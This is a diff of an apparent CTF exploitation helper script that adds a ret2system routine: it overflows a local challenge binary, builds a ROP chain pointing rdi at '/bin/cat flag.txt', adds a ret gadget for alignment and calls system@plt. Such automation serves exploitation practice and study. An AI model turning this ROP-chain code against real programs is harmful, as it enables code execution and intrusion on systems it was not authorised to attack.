@@ -37,14 +37,36 @@ class App:
         self.elf = self.pipe.cmd("aflj")
         
         #one = self.find_one_gadget(binary)
-        self.ret2execve(binary)
+        self.ret2system(binary)
 
     # ================ SOLVE FUNCTIONS ===================
+
+    def ret2system(self, binary, add_ret=True):
+        io = process(binary)
+
+        cat_flag = next(self.pwnelf.search(b"/bin/cat flag.txt"))
+        ret = None
+
+        for file, gadget in self.rs.search(search="ret"):
+            if "ret;" in str(gadget):
+                ret = int(str(gadget).split(":")[0], 16)
+                break
+
+        payload = self.find_overflow(binary)
+        payload += self.generate_rop_chain({"rdi": cat_flag})
+       
+        if add_ret:
+            payload += p64(ret)
+        
+        payload += p64(self.pwnelf.plt["system"])
+
+        io.sendlineafter(b">>>", payload)
+        
+        io.interactive()
 
     def ret2execve(self, binary):
         io = process(binary)
 
-        vuln = json.loads(self.pipe.cmd("pdfj @ sym.vuln"))
         binsh = next(self.pwnelf.search(b"/bin/sh"))
         
         # now that we have /bin/sh address, do the ROP chain
@@ -378,7 +400,7 @@ class App:
 
                 # we have found our gadget, now time to add it to our payload
                 payload += p64(int(use.split(":")[0], 16))
-
+                
                 alice = use.split(":")
                 instructions = alice[1].split(";")
 
